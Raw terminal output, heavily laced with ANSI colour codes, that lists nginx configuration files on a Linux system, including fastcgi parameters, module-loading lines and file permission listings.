[1;31m[0m	[1;31m[0ms[1;31m[0ms[1;31m[0ml[1;31m[0m_[1;31m[0mp[1;31m[0mr[1;31m[0me[1;31m[0mf[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0ms[1;31m[0me[1;31m[0mr[1;31m[0mv[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0mc[1;31m[0mi[1;31m[0mp[1;31m[0mh[1;31m[0me[1;31m[0mr[1;31m[0ms[1;31m[0m [1;31m[0mo[1;31m[0mn[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0ma[1;31m[0mc[1;31m[0mc[1;31m[0me[1;31m[0ms[1;31m[0ms[1;31m[0m_[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m [1;31m[0m/[1;31m[0mv[1;31m[0ma[1;31m[0mr[1;31m[0m/[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0ma[1;31m[0mc[1;31m[0mc[1;31m[0me[1;31m[0ms[1;31m[0ms[1;31m[0m.[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0me[1;31m[0mr[1;31m[0mr[1;31m[0mo[1;31m[0mr[1;31m[0m_[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m [1;31m[0m/[1;31m[0mv[1;31m[0ma[1;31m[0mr[1;31m[0m/[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0me[1;31m[0mr[1;31m[0mr[1;31m[0mo[1;31m[0mr[1;31m[0m.[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0mg[1;31m[0mz[1;31m[0mi[1;31m[0mp[1;31m[0m [1;31m[0mo[1;31m[0mn[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0mi[1;31m[0mn[1;31m[0mc[1;31m[0ml[1;31m[0mu[1;31m[0md[1;31m[0me[1;31m[0m [1;31m[0m/[1;31m[0me[1;31m[0mt[1;31m[0mc[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0mc[1;31m[0mo[1;31m[0mn[1;31m[0mf[1;31m[0m.[1;31m[0md[1;31m[0m/[1;31m[0m*[1;31m[0m.[1;31m[0mc[1;31m[0mo[1;31m[0mn[1;31m[0mf[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0mi[1;31m[0mn[1;31m[0mc[1;31m[0ml[1;31m[0mu[1;31m[0md[1;31m[0me[1;31m[0m [1;31m[0m/[1;31m[0me[1;31m[0mt[1;31m[0mc[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0ms[1;31m[0mi[1;31m[0mt[1;31m[0me[1;31m[0ms[1;31m[0m-[1;31m[0me[1;31m[0mn[1;31m[0ma[1;31m[0mb[1;31m[0ml[1;31m[0me[1;31m[0md[1;31m[0m/[1;31m[0m*[1;31m[0m;[1;31m[0m
[1;31m[0m}[1;31m[0m
-rw-r--r-- 1 root root 1125 May 30  2023 /etc/nginx/fastcgi[1;31m.conf[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mS[1;31m[0mC[1;31m[0mR[1;31m[0mI[1;31m[0mP[1;31m[0mT[1;31m[0m_[1;31m[0mF[1;31m[0mI[1;31m[0mL[1;31m[0mE[1;31m[0mN[1;31m[0mA[1;31m[0mM[1;31m[0mE[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0md[1;31m[0mo[1;31m[0mc[1;31m[0mu[1;31m[0mm[1;31m[0me[1;31m[0mn[1;31m[0mt[1;31m[0m_[1;31m[0mr[1;31m[0mo[1;31m[0mo[1;31m[0mt[1;31m[0m$[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0ms[1;31m[0mc[1;31m[0mr[1;31m[0mi[1;31m[0mp[1;31m[0mt[1;31m[0m_[1;31m[0mn[1;31m[0ma[1;31m[0mm[1;31m[0me[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mQ[1;31m[0mU[1;31m[0mE[1;31m[0mR[1;31m[0mY[1;31m[0m_[1;31m[0mS[1;31m[0mT[1;31m[0mR[1;31m[0mI[1;31m[0mN[1;31m[0mG[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0mq[1;31m[0mu[1;31m[0me[1;31m[0mr[1;31m[0my[1;31m[0m_[1;31m[0ms[1;31m[0mt[1;31m[0mr[1;31m[0mi[1;31m[0mn[1;31m[0mg[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mR[1;31m[0mE[1;31m[0mQ[1;31m[0mU[1;31m[0mE[1;31m[0mS[1;31m[0mT[1;31m[0m_[1;31m[0mM[1;31m[0mE[1;31m[0mT[1;31m[0mH[1;31m[0mO[1;31m[0mD[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0mr[1;31m[0me[1;31m[0mq[1;31m[0mu[1;31m[0me[1;31m[0ms[1;31m[0mt[1;31m[0m_[1;31m[0mm[1;31m[0me[1;31m[0mt[1;31m[0mh[1;31m[0mo[1;31m[0md[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mC[1;31m[0mO[1;31m[0mN[1;31m[0mT[1;31m[0mE[1;31m[0mN[1;31m[0mT[1;31m[0m_[1;31m[0mT[1;31m[0mY[1;31m[0mP[1;31m[0mE[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0mc[1;31m[0mo[1;31m[0mn[1;31m[0mt[1;31m[0me[1;31m[0mn[1;31m[0mt[1;31m[0m_[1;31m[0mt[1;31m[0my[1;31m[0mp[1;31m[0me[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mC[1;31m[0mO[1;31m[0mN[1;31m[0mT[1;31m[0mE[1;31m[0mN[1;31m[0mT[1;31m[0m_[1;31m[0mL[1;31m[0mE[1;31m[0mN[1;31m[0mG[1;31m[0mT[1;31m[0mH[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0mc[1;31m[0mo[1;31m[0mn[1;31m[0mt[1;31m[0me[1;31m[0mn[1;31m[0mt[1;31m[0m_[1;31m[0ml[1;31m[0me[1;31m[0mn[1;31m[0mg[1;31m[0mt[1;31m[0mh[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mS[1;31m[0mC[1;31m[0mR[1;31m[0mI[1;31m[0mP[1;31m[0mT[1;31m[0m_[1;31m[0mN[1;31m[0mA[1;31m[0mM[1;31m[0mE[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0ms[1;31m[0mc[1;31m[0mr[1;31m[0mi[1;31m[0mp[1;31m[0mt[1;31m[0m_[1;31m[0mn[1;31m[0ma[1;31m[0mm[1;31m[0me[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mR[1;31m[0mE[1;31m[0mQ[1;31m[0mU[1;31m[0mE[1;31m[0mS[1;31m[0mT[1;31m[0m_[1;31m[0mU[1;31m[0mR[1;31m[0mI[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0mr[1;31m[0me[1;31m[0mq[1;31m[0mu[1;31m[0me[1;31m[0ms[1;31m[0mt[1;31m[0m_[1;31m[0mu[1;31m[0mr[1;31m[0mi[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mD[1;31m[0mO[1;31m[0mC[1;31m[0mU[1;31m[0mM[1;31m[0mE[1;31m[0mN[1;31m[0mT[1;31m[0m_[1;31m[0mU[1;31m[0mR[1;31m[0mI[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0md[1;31m[0mo[1;31m[0mc[1;31m[0mu[1;31m[0mm[1;31m[0me[1;31m[0mn[1;31m[0mt[1;31m[0m_[1;31m[0mu[1;31m[0mr[1;31m[0mi[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mD[1;31m[0mO[1;31m[0mC[1;31m[0mU[1;31m[0mM[1;31m[0mE[1;31m[0mN[1;31m[0mT[1;31m[0m_[1;31m[0mR[1;31m[0mO[1;31m[0mO[1;31m[0mT[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0md[1;31m[0mo[1;31m[0mc[1;31m[0mu[1;31m[0mm[1;31m[0me[1;31m[0mn[1;31m[0mt[1;31m[0m_[1;31m[0mr[1;31m[0mo[1;31m[0mo[1;31m[0mt[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mS[1;31m[0mE[1;31m[0mR[1;31m[0mV[1;31m[0mE[1;31m[0mR[1;31m[0m_[1;31m[0mP[1;31m[0mR[1;31m[0mO[1;31m[0mT[1;31m[0mO[1;31m[0mC[1;31m[0mO[1;31m[0mL[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0ms[1;31m[0me[1;31m[0mr[1;31m[0mv[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0mp[1;31m[0mr[1;31m[0mo[1;31m[0mt[1;31m[0mo[1;31m[0mc[1;31m[0mo[1;31m[0ml[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mR[1;31m[0mE[1;31m[0mQ[1;31m[0mU[1;31m[0mE[1;31m[0mS[1;31m[0mT[1;31m[0m_[1;31m[0mS[1;31m[0mC[1;31m[0mH[1;31m[0mE[1;31m[0mM[1;31m[0mE[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0ms[1;31m[0mc[1;31m[0mh[1;31m[0me[1;31m[0mm[1;31m[0me[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mH[1;31m[0mT[1;31m[0mT[1;31m[0mP[1;31m[0mS[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0mh[1;31m[0mt[1;31m[0mt[1;31m[0mp[1;31m[0ms[1;31m[0m [1;31m[0mi[1;31m[0mf[1;31m[0m_[1;31m[0mn[1;31m[0mo[1;31m[0mt[1;31m[0m_[1;31m[0me[1;31m[0mm[1;31m[0mp[1;31m[0mt[1;31m[0my[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mG[1;31m[0mA[1;31m[0mT[1;31m[0mE[1;31m[0mW[1;31m[0mA[1;31m[0mY[1;31m[0m_[1;31m[0mI[1;31m[0mN[1;31m[0mT[1;31m[0mE[1;31m[0mR[1;31m[0mF[1;31m[0mA[1;31m[0mC[1;31m[0mE[1;31m[0m [1;31m[0m [1;31m[0mC[1;31m[0mG[1;31m[0mI[1;31m[0m/[1;31m[0m1[1;31m[0m.[1;31m[0m1[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mS[1;31m[0mE[1;31m[0mR[1;31m[0mV[1;31m[0mE[1;31m[0mR[1;31m[0m_[1;31m[0mS[1;31m[0mO[1;31m[0mF[1;31m[0mT[1;31m[0mW[1;31m[0mA[1;31m[0mR[1;31m[0mE[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0m$[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m_[1;31m[0mv[1;31m[0me[1;31m[0mr[1;31m[0ms[1;31m[0mi[1;31m[0mo[1;31m[0mn[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mR[1;31m[0mE[1;31m[0mM[1;31m[0mO[1;31m[0mT[1;31m[0mE[1;31m[0m_[1;31m[0mA[1;31m[0mD[1;31m[0mD[1;31m[0mR[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0mr[1;31m[0me[1;31m[0mm[1;31m[0mo[1;31m[0mt[1;31m[0me[1;31m[0m_[1;31m[0ma[1;31m[0md[1;31m[0md[1;31m[0mr[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mR[1;31m[0mE[1;31m[0mM[1;31m[0mO[1;31m[0mT[1;31m[0mE[1;31m[0m_[1;31m[0mP[1;31m[0mO[1;31m[0mR[1;31m[0mT[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0mr[1;31m[0me[1;31m[0mm[1;31m[0mo[1;31m[0mt[1;31m[0me[1;31m[0m_[1;31m[0mp[1;31m[0mo[1;31m[0mr[1;31m[0mt[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mR[1;31m[0mE[1;31m[0mM[1;31m[0mO[1;31m[0mT[1;31m[0mE[1;31m[0m_[1;31m[0mU[1;31m[0mS[1;31m[0mE[1;31m[0mR[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0mr[1;31m[0me[1;31m[0mm[1;31m[0mo[1;31m[0mt[1;31m[0me[1;31m[0m_[1;31m[0mu[1;31m[0ms[1;31m[0me[1;31m[0mr[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mS[1;31m[0mE[1;31m[0mR[1;31m[0mV[1;31m[0mE[1;31m[0mR[1;31m[0m_[1;31m[0mA[1;31m[0mD[1;31m[0mD[1;31m[0mR[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0ms[1;31m[0me[1;31m[0mr[1;31m[0mv[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0ma[1;31m[0md[1;31m[0md[1;31m[0mr[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mS[1;31m[0mE[1;31m[0mR[1;31m[0mV[1;31m[0mE[1;31m[0mR[1;31m[0m_[1;31m[0mP[1;31m[0mO[1;31m[0mR[1;31m[0mT[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0ms[1;31m[0me[1;31m[0mr[1;31m[0mv[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0mp[1;31m[0mo[1;31m[0mr[1;31m[0mt[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mS[1;31m[0mE[1;31m[0mR[1;31m[0mV[1;31m[0mE[1;31m[0mR[1;31m[0m_[1;31m[0mN[1;31m[0mA[1;31m[0mM[1;31m[0mE[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m$[1;31m[0ms[1;31m[0me[1;31m[0mr[1;31m[0mv[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0mn[1;31m[0ma[1;31m[0mm[1;31m[0me[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0m [1;31m[0mR[1;31m[0mE[1;31m[0mD[1;31m[0mI[1;31m[0mR[1;31m[0mE[1;31m[0mC[1;31m[0mT[1;31m[0m_[1;31m[0mS[1;31m[0mT[1;31m[0mA[1;31m[0mT[1;31m[0mU[1;31m[0mS[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m2[1;31m[0m0[1;31m[0m0[1;31m[0m;[1;31m[0m
lrwxrwxrwx 1 root root 60 Sep 16  2025 /etc/nginx/modules-enabled/50-mod-http-xslt-filter[1;31m.conf[0m -> /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
[1;31m[0ml[1;31m[0mo[1;31m[0ma[1;31m[0md[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m [1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0ms[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mx[1;31m[0m_[1;31m[0mh[1;31m[0mt[1;31m[0mt[1;31m[0mp[1;31m[0m_[1;31m[0mx[1;31m[0ms[1;31m[0ml[1;31m[0mt[1;31m[0m_[1;31m[0mf[1;31m[0mi[1;31m[0ml[1;31m[0mt[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m.[1;31m[0ms[1;31m[0mo[1;31m[0m;[1;31m[0m
lrwxrwxrwx 1 root root 61 Sep 16  2025 /etc/nginx/modules-enabled/50-mod-http-image-filter[1;31m.conf[0m -> /usr/share/nginx/modules-available/mod-http-image-filter.conf
[1;31m[0ml[1;31m[0mo[1;31m[0ma[1;31m[0md[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m [1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0ms[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mx[1;31m[0m_[1;31m[0mh[1;31m[0mt[1;31m[0mt[1;31m[0mp[1;31m[0m_[1;31m[0mi[1;31m[0mm[1;31m[0ma[1;31m[0mg[1;31m[0me[1;31m[0m_[1;31m[0mf[1;31m[0mi[1;31m[0ml[1;31m[0mt[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m.[1;31m[0ms[1;31m[0mo[1;31m[0m;[1;31m[0m
lrwxrwxrwx 1 root root 55 Sep 16  2025 /etc/nginx/modules-enabled/50-mod-http-geoip2[1;31m.conf[0m -> /usr/share/nginx/modules-available/mod-http-geoip2.conf
[1;31m[0ml[1;31m[0mo[1;31m[0ma[1;31m[0md[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m [1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0ms[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mx[1;31m[0m_[1;31m[0mh[1;31m[0mt[1;31m[0mt[1;31m[0mp[1;31m[0m_[1;31m[0mg[1;31m[0me[1;31m[0mo[1;31m[0mi[1;31m[0mp[1;31m[0m2[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m.[1;31m[0ms[1;31m[0mo[1;31m[0m;[1;31m[0m
lrwxrwxrwx 1 root root 57 Sep 16  2025 /etc/nginx/modules-enabled/70-mod-stream-geoip2[1;31m.conf[0m -> /usr/share/nginx/modules-available/mod-stream-geoip2.conf
[1;31m[0ml[1;31m[0mo[1;31m[0ma[1;31m[0md[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m [1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0ms[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mx[1;31m[0m_[1;31m[0ms[1;31m[0mt[1;31m[0mr[1;31m[0me[1;31m[0ma[1;31m[0mm[1;31m[0m_[1;31m[0mg[1;31m[0me[1;31m[0mo[1;31m[0mi[1;31m[0mp[1;31m[0m2[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m.[1;31m[0ms[1;31m[0mo[1;31m[0m;[1;31m[0m
lrwxrwxrwx 1 root root 50 Sep 16  2025 /etc/nginx/modules-enabled/50-mod-stream[1;31m.conf[0m -> /usr/share/nginx/modules-available/mod-stream.conf
[1;31m[0ml[1;31m[0mo[1;31m[0ma[1;31m[0md[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m [1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0ms[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mx[1;31m[0m_[1;31m[0ms[1;31m[0mt[1;31m[0mr[1;31m[0me[1;31m[0ma[1;31m[0mm[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m.[1;31m[0ms[1;31m[0mo[1;31m[0m;[1;31m[0m
lrwxrwxrwx 1 root root 48 Sep 16  2025 /etc/nginx/modules-enabled/50-mod-mail[1;31m.conf[0m -> /usr/share/nginx/modules-available/mod-mail.conf
[1;31m[0ml[1;31m[0mo[1;31m[0ma[1;31m[0md[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m [1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0ms[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mx[1;31m[0m_[1;31m[0mm[1;31m[0ma[1;31m[0mi[1;31m[0ml[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m.[1;31m[0ms[1;31m[0mo[1;31m[0m;[1;31m[0m

-rw-r--r-- 1 root root 374 May 30  2023 /etc/ufw/applications.d/[1;31mnginx[0m

drwxr-xr-x 3 root root 4096 Sep 16  2025 /usr/lib/[1;31mnginx[0m

-rwxr-xr-x 1 root root 1240136 Apr 23 12:28 /usr/sbin/[1;31mnginx[0m

drwxr-xr-x 2 root root 4096 May 13 12:37 /usr/share/doc/[1;31mnginx[0m

drwxr-xr-x 4 root root 4096 Sep 16  2025 /usr/share/[1;31mnginx[0m
-rw-r--r-- 1 root root 47 Apr 23 12:28 /usr/share/nginx/modules-available/mod-http-geoip2[1;31m.conf[0m
[1;31m[0ml[1;31m[0mo[1;31m[0ma[1;31m[0md[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m [1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0ms[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mx[1;31m[0m_[1;31m[0mh[1;31m[0mt[1;31m[0mt[1;31m[0mp[1;31m[0m_[1;31m[0mg[1;31m[0me[1;31m[0mo[1;31m[0mi[1;31m[0mp[1;31m[0m2[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m.[1;31m[0ms[1;31m[0mo[1;31m[0m;[1;31m[0m
-rw-r--r-- 1 root root 52 Apr 23 12:28 /usr/share/nginx/modules-available/mod-http-xslt-filter[1;31m.conf[0m
